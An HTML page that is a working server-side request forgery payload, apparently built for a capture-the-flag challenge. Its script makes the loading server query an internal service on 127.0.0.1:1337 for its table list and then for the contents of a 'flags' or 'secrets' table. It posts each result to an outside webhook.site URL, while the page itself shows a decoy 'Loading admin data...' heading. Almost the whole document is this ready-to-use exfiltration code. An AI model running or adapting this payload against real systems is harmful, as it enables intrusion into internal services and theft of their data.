<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF Capture</title>
</head>
<body>
    <h1>Loading admin data...</h1>
    <script>
        // Step 1: Fetch the list of tables from /tables
        fetch('http://127.0.0.1:1337/tables')
            .then(response => response.text())
            .then(data => {
                // Send the tables list to Webhook.site
                sendToWebhook('tables_data', data);

                // Parse the tables to find a likely flag table (e.g., 'flags', 'secrets')
                let tables = JSON.parse(data).tables;
                let targetTable = tables.find(t => t === 'flags') || tables.find(t => t === 'secrets') || tables[0];

                // Step 2: Fetch the contents of the target table
                if (targetTable) {
                    fetch('http://127.0.0.1:1337/table', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ tableName: targetTable })
                    })
                    .then(res => res.text())
                    .then(tableData => {
                        // Send the table contents to Webhook.site
                        sendToWebhook('table_contents', tableData);
                    })
                    .catch(err => console.error('Table fetch error:', err));
                }
            })
            .catch(err => console.error('Tables fetch error:', err));

        // Function to send data to Webhook.site
        function sendToWebhook(key, value) {
            fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {  // Replace with your Webhook.site URL
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `${key}=${encodeURIComponent(value)}`
            })
            .then(() => console.log(`Sent ${key} to Webhook.site`))
            .catch(err => console.error('Webhook error:', err));
        }
    </script>
</body>
</html>
